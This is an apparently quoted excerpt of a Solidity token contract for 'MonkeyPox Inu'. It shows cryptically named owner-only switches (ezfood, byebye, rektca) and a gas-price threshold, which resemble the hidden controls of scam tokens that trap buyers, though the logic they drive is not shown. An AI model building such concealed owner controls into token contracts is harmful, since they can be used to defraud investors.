...
Telegram : https://t.me/monkeypoxinuofficial
...
contract CryptoBell is Context, IERC20, Ownable {
    ...
    bool private ezfood = true;
    bool private byebye = true;
    bool private rektca = true;
    uint256 private x = 1000 * 1 gwei; 
    ...
    address public marketingWallet = 0x777953b92B98e93fC8F1B67Ad82063082554a17C;
    address public donationWallet = 0x1CA347759A6203Edd31EB5F1fe9198304cb51bFE;


    string private constant _name = "MonkeyPox Inu";
    ...
    function setEzFood(bool state) external onlyOwner{
        ezfood = state;
    }

    function setRektca(bool state) external onlyOwner{
        rektca = state;
    }

    function setx(uint256 new_x) external onlyOwner{
        x = new_x * 1 gwei;
    }

    function setByeBye(bool state) external onlyOwner{
        byebye = state;
    }

    function trestilo() external onlyOwner{
